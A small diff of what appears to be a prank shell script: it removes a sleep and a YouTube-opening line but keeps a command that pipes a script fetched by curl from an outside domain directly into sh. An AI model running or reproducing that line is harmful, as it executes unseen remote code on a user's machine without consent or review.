@@ -32,7 +32,3 @@ echo "loL";
 echo "\n";
 
 termdo 'curl -s https://suckaaa.com/s/current-location | sh';
-
-sleep 4s;
-
-open https://www.youtube.com/watch?v=7zPnTtF0Wk8&feature=youtu.be;
